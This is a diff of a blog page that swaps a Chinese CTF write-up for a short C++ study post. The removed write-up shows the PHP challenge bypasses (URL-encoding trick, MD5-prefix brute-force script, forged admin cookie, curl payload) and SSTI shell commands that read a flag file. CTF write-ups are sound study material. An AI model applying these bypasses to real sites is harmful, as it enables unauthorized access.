@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="1.sign in\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 &lt;?php error_reporting(0); include_once &#39;flag.php&#39;; if ($_SERVER[&#39;QUERY_STRING&#39;]) { if (preg_match(&#34;/[A-Za-z]+/&#34;, $_SERVER[&#39;QUERY_STRING&#39;])) { die(&#34;I hate English!&#34;); } if (substr(md5($_POST[&#39;nsilab&#39;]), 0, 4) !== &#34;ba3f&#34; || $_GET[&#39;hi&#39;] !== &#34;web&#34;) { die(&#34;Oops! It&#39;s wrong!&#34;); } if ($_COOKIE[&#39;user&#39;] !== &#39;admin&#39;) { die(&#34;You are not admin!&#34;); } locate(); } else { highlight_file(__FILE__); } ?&gt; 三层过滤 以下是对该PHP代码的详细解释及解题思路：\n">
-<title>淘汰赛</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="牛客CPP2 实现四舍五入\r这里看到了两种做法,第一种实现是: 由于C++中double类型是自动四舍五入的,所以直接格式化输出0位小数:\n1 2 3 4 5 6 7 8 9 10 11 12 13 #include &lt;iostream&gt; using namespace std; int main() { double a; cin &gt;&gt; a; printf(&#34;%.0f&#34;, a); return 0; } 在题解中看到更加优雅的实现方法:\n">
+<title>C&#43;&#43; 学习</title>
 
-<link rel='canonical' href='https://Oight.github.io/p/%E6%B7%98%E6%B1%B0%E8%B5%9B/'>
+<link rel='canonical' href='https://Oight.github.io/p/c-%E5%AD%A6%E4%B9%A0/'>
 
-<link rel="stylesheet" href="/scss/style.min.0e9b0dc41309ee439f307e94fe233ae09b70f32858267ed1afae44d0ba448205.css"><meta property='og:title' content="淘汰赛">
-<meta property='og:description' content="1.sign in\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 &lt;?php error_reporting(0); include_once &#39;flag.php&#39;; if ($_SERVER[&#39;QUERY_STRING&#39;]) { if (preg_match(&#34;/[A-Za-z]+/&#34;, $_SERVER[&#39;QUERY_STRING&#39;])) { die(&#34;I hate English!&#34;); } if (substr(md5($_POST[&#39;nsilab&#39;]), 0, 4) !== &#34;ba3f&#34; || $_GET[&#39;hi&#39;] !== &#34;web&#34;) { die(&#34;Oops! It&#39;s wrong!&#34;); } if ($_COOKIE[&#39;user&#39;] !== &#39;admin&#39;) { die(&#34;You are not admin!&#34;); } locate(); } else { highlight_file(__FILE__); } ?&gt; 三层过滤 以下是对该PHP代码的详细解释及解题思路：\n">
-<meta property='og:url' content='https://Oight.github.io/p/%E6%B7%98%E6%B1%B0%E8%B5%9B/'>
+<link rel="stylesheet" href="/scss/style.min.0e9b0dc41309ee439f307e94fe233ae09b70f32858267ed1afae44d0ba448205.css"><meta property='og:title' content="C++ 学习">
+<meta property='og:description' content="牛客CPP2 实现四舍五入\r这里看到了两种做法,第一种实现是: 由于C++中double类型是自动四舍五入的,所以直接格式化输出0位小数:\n1 2 3 4 5 6 7 8 9 10 11 12 13 #include &lt;iostream&gt; using namespace std; int main() { double a; cin &gt;&gt; a; printf(&#34;%.0f&#34;, a); return 0; } 在题解中看到更加优雅的实现方法:\n">
+<meta property='og:url' content='https://Oight.github.io/p/c-%E5%AD%A6%E4%B9%A0/'>
 <meta property='og:site_name' content='Oight'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-06-01T10:30:04&#43;08:00'/><meta property='article:modified_time' content='2025-06-01T10:30:04&#43;08:00'/>
-<meta name="twitter:title" content="淘汰赛">
-<meta name="twitter:description" content="1.sign in\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 &lt;?php error_reporting(0); include_once &#39;flag.php&#39;; if ($_SERVER[&#39;QUERY_STRING&#39;]) { if (preg_match(&#34;/[A-Za-z]+/&#34;, $_SERVER[&#39;QUERY_STRING&#39;])) { die(&#34;I hate English!&#34;); } if (substr(md5($_POST[&#39;nsilab&#39;]), 0, 4) !== &#34;ba3f&#34; || $_GET[&#39;hi&#39;] !== &#34;web&#34;) { die(&#34;Oops! It&#39;s wrong!&#34;); } if ($_COOKIE[&#39;user&#39;] !== &#39;admin&#39;) { die(&#34;You are not admin!&#34;); } locate(); } else { highlight_file(__FILE__); } ?&gt; 三层过滤 以下是对该PHP代码的详细解释及解题思路：\n">
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-10-22T10:29:47&#43;08:00'/><meta property='article:modified_time' content='2025-10-22T10:29:47&#43;08:00'/>
+<meta name="twitter:title" content="C++ 学习">
+<meta name="twitter:description" content="牛客CPP2 实现四舍五入\r这里看到了两种做法,第一种实现是: 由于C++中double类型是自动四舍五入的,所以直接格式化输出0位小数:\n1 2 3 4 5 6 7 8 9 10 11 12 13 #include &lt;iostream&gt; using namespace std; int main() { double a; cin &gt;&gt; a; printf(&#34;%.0f&#34;, a); return 0; } 在题解中看到更加优雅的实现方法:\n">
     <link rel="shortcut icon" href="/favicon.ico" />
 
     </head>
@@ -261,25 +261,9 @@
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ol>
-    <li>
-      <ol>
-        <li><a href="#代码逻辑分析"><strong>代码逻辑分析</strong></a></li>
-        <li><a href="#解题步骤"><strong>解题步骤</strong></a>
-          <ol>
-            <li><a href="#1-绕过查询字符串字母检测"><strong>1. 绕过查询字符串字母检测</strong></a></li>
-            <li><a href="#2-碰撞md5前4位为"><strong>2. 碰撞MD5前4位为<code>ba3f</code></strong></a></li>
-            <li><a href="#3-设置管理员cookie"><strong>3. 设置管理员Cookie</strong></a></li>
-            <li><a href="#4-发送完整请求"><strong>4. 发送完整请求</strong></a></li>
-          </ol>
-        </li>
-        <li><a href="#漏洞总结"><strong>漏洞总结</strong></a></li>
-        <li><a href="#最终payload示例"><strong>最终Payload示例</strong></a></li>
-      </ol>
-    </li>
-  </ol>
-
-  <ol>
-    <li><a href="#学姐手把手教学效果显著">学姐手把手教学，效果显著（）</a></li>
+    <li><a href="#牛客cpp2-实现四舍五入">牛客CPP2 实现四舍五入</a></li>
+    <li><a href="#endl-和-n-的区别">endl 和 /n 的区别:</a></li>
+    <li><a href="#牛客cpp4-获取两数中的较大值">牛客CPP4 获取两数中的较大值</a></li>
   </ol>
 </nav>
         </div>
@@ -298,8 +282,8 @@
     
     <header class="article-category">
         
-            <a href="/categories/wp/" >
-                WP
+            <a href="/categories/%E7%BC%96%E7%A8%8B/" >
+                编程
             </a>
         
     </header>
@@ -307,7 +291,7 @@
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/p/%E6%B7%98%E6%B1%B0%E8%B5%9B/">淘汰赛</a>
+            <a href="/p/c-%E5%AD%A6%E4%B9%A0/">C&#43;&#43; 学习</a>
         </h2>
     
         
@@ -329,7 +313,7 @@
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">2025-06-01</time>
+                <time class="article-time--published">2025-10-22</time>
             </div>
         
 
@@ -344,7 +328,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 3 分钟
+                    阅读时长: 1 分钟
                 </time>
             </div>
         
@@ -359,8 +343,43 @@
     <section class="article-content">
     
     
-    <h1 id="1sign-in">1.sign in
-</h1><div class="highlight"><div class="chroma">
+    <h2 id="牛客cpp2-实现四舍五入">牛客CPP2 实现四舍五入
+</h2><p>这里看到了两种做法,第一种实现是:
+由于C++中double类型是自动四舍五入的,所以直接格式化输出0位小数:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">double</span> <span class="n">a</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">cin</span> <span class="o">&gt;&gt;</span> <span class="n">a</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%.0f&#34;</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在题解中看到更加优雅的实现方法:</p>
+<div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -378,180 +397,33 @@
 </span><span class="lnt">14
 </span><span class="lnt">15
 </span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
-</span></span><span class="line"><span class="cl">error_reporting(0);
-</span></span><span class="line"><span class="cl">include_once &#39;flag.php&#39;;
-</span></span><span class="line"><span class="cl">if ($_SERVER[&#39;QUERY_STRING&#39;]) {
-</span></span><span class="line"><span class="cl">    if (preg_match(&#34;/[A-Za-z]+/&#34;, $_SERVER[&#39;QUERY_STRING&#39;])) {
-</span></span><span class="line"><span class="cl">        die(&#34;I hate English!&#34;);
-</span></span><span class="line"><span class="cl">    }
-</span></span><span class="line"><span class="cl">    if (substr(md5($_POST[&#39;nsilab&#39;]), 0, 4) !== &#34;ba3f&#34; || $_GET[&#39;hi&#39;] !== &#34;web&#34;) {
-</span></span><span class="line"><span class="cl">        die(&#34;Oops! It&#39;s wrong!&#34;);
-</span></span><span class="line"><span class="cl">    }
-</span></span><span class="line"><span class="cl">    if ($_COOKIE[&#39;user&#39;] !== &#39;admin&#39;) {
-</span></span><span class="line"><span class="cl">        die(&#34;You are not admin!&#34;);
-</span></span><span class="line"><span class="cl">    }
-</span></span><span class="line"><span class="cl">    locate();
-</span></span><span class="line"><span class="cl">} else {
-</span></span><span class="line"><span class="cl">    highlight_file(__FILE__);
-</span></span><span class="line"><span class="cl">}
-</span></span><span class="line"><span class="cl">?&gt;
+<pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">double</span> <span class="n">d</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cin</span> <span class="o">&gt;&gt;</span> <span class="n">d</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">d</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cout</span><span class="o">&lt;&lt;</span><span class="p">(</span><span class="kt">int</span><span class="p">)(</span><span class="n">d</span><span class="o">+</span><span class="mf">0.5</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cout</span><span class="o">&lt;&lt;</span><span class="p">(</span><span class="kt">int</span><span class="p">)(</span><span class="n">d</span><span class="o">-</span><span class="mf">0.5</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>三层过滤
-以下是对该PHP代码的详细解释及解题思路：</p>
-<hr>
-<h3 id="代码逻辑分析"><strong>代码逻辑分析</strong>
-</h3><ol>
-<li>
-<p><strong>错误报告与文件包含</strong>：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php
-</span></span><span class="line"><span class="cl">error_reporting(0);            // 关闭错误显示
-</span></span><span class="line"><span class="cl">include_once &#39;flag.php&#39;;       // 包含flag文件（关键目标）
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
-<li>
-<p><strong>查询字符串检查</strong>：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php
-</span></span><span class="line"><span class="cl">if ($_SERVER[&#39;QUERY_STRING&#39;]) {
-</span></span><span class="line"><span class="cl">    // 检查查询字符串是否包含字母
-</span></span><span class="line"><span class="cl">    if (preg_match(&#34;/[A-Za-z]+/&#34;, $_SERVER[&#39;QUERY_STRING&#39;])) {
-</span></span><span class="line"><span class="cl">        die(&#34;I hate English!&#34;);
-</span></span><span class="line"><span class="cl">    }
-</span></span><span class="line"><span class="cl">    // 其他条件...
-</span></span><span class="line"><span class="cl">} else {
-</span></span><span class="line"><span class="cl">    highlight_file(__FILE__);  // 无查询字符串时显示源码
-</span></span><span class="line"><span class="cl">}
-</span></span></code></pre></td></tr></table>
-</div>
-</div><ul>
-<li><strong>漏洞点</strong>：<code>$_SERVER['QUERY_STRING']</code> 是原始未解码的字符串，可通过URL编码绕过字母检测。</li>
-</ul>
-</li>
-<li>
-<p><strong>MD5校验与参数检查</strong>：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php
-</span></span><span class="line"><span class="cl">if (substr(md5($_POST[&#39;nsilab&#39;]), 0, 4) !== &#34;ba3f&#34; || $_GET[&#39;hi&#39;] !== &#34;web&#34;) {
-</span></span><span class="line"><span class="cl">    die(&#34;Oops! It&#39;s wrong!&#34;);
-</span></span><span class="line"><span class="cl">}
-</span></span></code></pre></td></tr></table>
-</div>
-</div><ul>
-<li>要求POST参数 <code>nsilab</code> 的MD5值前4位为 <code>ba3f</code>。</li>
-<li>GET参数 <code>hi</code> 必须等于 <code>web</code>。</li>
-</ul>
-</li>
-<li>
-<p><strong>Cookie权限校验</strong>：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php
-</span></span><span class="line"><span class="cl">if ($_COOKIE[&#39;user&#39;] !== &#39;admin&#39;) {
-</span></span><span class="line"><span class="cl">    die(&#34;You are not admin!&#34;);
-</span></span><span class="line"><span class="cl">}
-</span></span></code></pre></td></tr></table>
-</div>
-</div><ul>
-<li>需设置Cookie <code>user=admin</code>。</li>
-</ul>
-</li>
-<li>
-<p><strong>成功条件</strong>：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php
-</span></span><span class="line"><span class="cl">locate();  // 猜测此函数会输出flag
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
-</ol>
-<hr>
-<h3 id="解题步骤"><strong>解题步骤</strong>
-</h3><h4 id="1-绕过查询字符串字母检测"><strong>1. 绕过查询字符串字母检测</strong>
-</h4><ul>
-<li>
-<p><strong>目标</strong>：传递 <code>hi=web</code>，但确保 <code>QUERY_STRING</code> 无字母。</p>
-</li>
-<li>
-<p>方法</p>
-<p>：将参数名和值URL编码为十六进制形式：</p>
-<ul>
-<li><code>hi</code> → <code>%68%69</code>（h的ASCII码是0x68，i是0x69）</li>
-<li><code>web</code> → <code>%77%65%62</code>（w=0x77, e=0x65, b=0x62）</li>
-</ul>
-</li>
-<li>
-<p>构造查询字符串</p>
-<p>：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">plaintext
-</span></span><span class="line"><span class="cl">?%68%69=%77%65%62
-</span></span></code></pre></td></tr></table>
-</div>
-</div><ul>
-<li><code>$_SERVER['QUERY_STRING']</code> 为 <code>%68%69=%77%65%62</code>（无字母）。</li>
-<li>PHP自动解码后，<code>$_GET['hi']</code> 为 <code>web</code>。</li>
-</ul>
-</li>
-</ul>
-<h4 id="2-碰撞md5前4位为"><strong>2. 碰撞MD5前4位为<code>ba3f</code></strong>
-</h4><ul>
-<li>
-<p><strong>目标</strong>：找到字符串 <code>nsilab</code>，满足 <code>md5(nsilab)[0:4] == &quot;ba3f&quot;</code>。</p>
-</li>
-<li>
-<p>暴力破解脚本</p>
-<p>：</p>
-<div class="highlight"><div class="chroma">
+</div><p>这个是游戏编程里常用的方法,正数浮点数+0.5(负数浮点数-0.5)后强制类型转换相当于四舍五入</p>
+<p>这个原理是:由于强制转型的时候程序会直接截断小数(向零取整),所以对任意一个正数加0.5,如果它的小数部分&gt;0.5 则进一,然后直接截断,对于负数同理,减去0.5,然后向零取整.</p>
+<p>这样就实现了四舍五入的功能.</p>
+<h2 id="endl-和-n-的区别">endl 和 /n 的区别:
+</h2><p><strong>endl: endl</strong> 会输出 &lsquo;\n&rsquo; ,然后立即刷新缓冲区并输出到屏幕上,由于要刷新缓冲区, endl 会比 \n 慢一点</p>
+<h2 id="牛客cpp4-获取两数中的较大值">牛客CPP4 获取两数中的较大值
+</h2><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -564,114 +436,24 @@
 </span><span class="lnt"> 9
 </span><span class="lnt">10
 </span><span class="lnt">11
+</span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
-</span></span><span class="line"><span class="cl">import hashlib
+<pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp"> 
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">target = &#34;ba3f&#34;
-</span></span><span class="line"><span class="cl">for i in range(1000000):
-</span></span><span class="line"><span class="cl">    s = str(i)
-</span></span><span class="line"><span class="cl">    hash_md5 = hashlib.md5(s.encode()).hexdigest()
-</span></span><span class="line"><span class="cl">    if hash_md5.startswith(target):
-</span></span><span class="line"><span class="cl">        print(f&#34;Found: {s} → {hash_md5}&#34;)
-</span></span><span class="line"><span class="cl">        break
-</span></span><span class="line"><span class="cl">  // Found: 35350 → ba3fe3d296f3e7269b66f163d31b3dc3
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">a</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">b</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">a</span><span class="p">,</span><span class="o">&amp;</span><span class="n">b</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="n">a</span><span class="o">&gt;</span><span class="n">b</span><span class="o">?</span><span class="nl">a</span><span class="p">:</span><span class="n">b</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><ul>
-<li><strong>示例结果</strong>：<code>nsilab=35350</code></li>
-</ul>
-</li>
-</ul>
-<h4 id="3-设置管理员cookie"><strong>3. 设置管理员Cookie</strong>
-</h4><ul>
-<li><strong>添加Cookie</strong>：<code>user=admin</code>。</li>
-</ul>
-<h4 id="4-发送完整请求"><strong>4. 发送完整请求</strong>
-</h4><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http
-</span></span><span class="line"><span class="cl">GET /?%68%69=%77%65%62 HTTP/1.1
-</span></span><span class="line"><span class="cl">Host: target.com
-</span></span><span class="line"><span class="cl">Cookie: user=admin
-</span></span><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">nsilab=12345
-</span></span></code></pre></td></tr></table>
 </div>
-</div><hr>
-<h3 id="漏洞总结"><strong>漏洞总结</strong>
-</h3><div class="table-wrapper"><table>
-  <thead>
-      <tr>
-          <th>漏洞类型</th>
-          <th>利用方法</th>
-          <th>防御建议</th>
-      </tr>
-  </thead>
-  <tbody>
-      <tr>
-          <td>URL编码绕过</td>
-          <td>参数名和值URL编码为十六进制</td>
-          <td>检查解码后的参数</td>
-      </tr>
-      <tr>
-          <td>MD5弱校验</td>
-          <td>暴力碰撞前4位</td>
-          <td>使用强哈希（如SHA-256）</td>
-      </tr>
-      <tr>
-          <td>Cookie权限控制不严</td>
-          <td>直接设置Cookie为<code>user=admin</code></td>
-          <td>服务端Session管理或签名Cookie</td>
-      </tr>
-  </tbody>
-</table></div>
-<hr>
-<h3 id="最终payload示例"><strong>最终Payload示例</strong>
-</h3><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">bash
-</span></span><span class="line"><span class="cl">curl -X GET &#34;http://contest.ctf.nefu.edu.cn:33079/&#34; \
-</span></span><span class="line"><span class="cl">     -H &#34;Cookie: user=admin&#34; \
-</span></span><span class="line"><span class="cl">     -d &#34;nsilab=35350&#34;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>成功触发后，服务器会执行 <code>locate()</code> 函数并返回flag。</p>
-<h1 id="2ezssti">2.ezssti
-</h1><p>输入49
-发现可以SSTI
-使用焚靖
-get 方法传name</p>
-<blockquote>
-<p>cd .. &amp;&amp; ls -a</p></blockquote>
-<p>得到隐藏的<code>.flll4ggggg</code>文件
-用<code>tac /.flll4ggggg</code>得到<code>flag</code></p>
-<h1 id="art">Art
-</h1><h2 id="学姐手把手教学效果显著">学姐手把手教学，效果显著（）
-</h2><blockquote>
-<p>灵感来源：<a class="link" href="https://github.com/JuliaPoo/Artfuscator"  target="_blank" rel="noopener"
-    >Artfuscator</a></p></blockquote>
-<p>IDA打开，进入main函数</p>
-<p>Ctrl 加滚轮放大</p>
-<p>就能看到flag</p>
-
 </section>
 
 
@@ -707,12 +489,12 @@ get 方法传name</p>
             
                 
 <article class="">
-    <a href="/p/%E7%BE%8A%E5%9F%8E%E6%9D%AF2025-write-up/">
+    <a href="/p/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">羊城杯2025 Write UP</h2>
+            <h2 class="article-title">数据结构学习</h2>
         </div>
     </a>
 </article>
@@ -720,12 +502,12 @@ get 方法传name</p>
             
                 
 <article class="">
-    <a href="/p/tgctf%E9%83%A8%E5%88%86wp/">
+    <a href="/p/%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">TGCTF部分WP</h2>
+            <h2 class="article-title">编程学习</h2>
         </div>
     </a>
 </article>
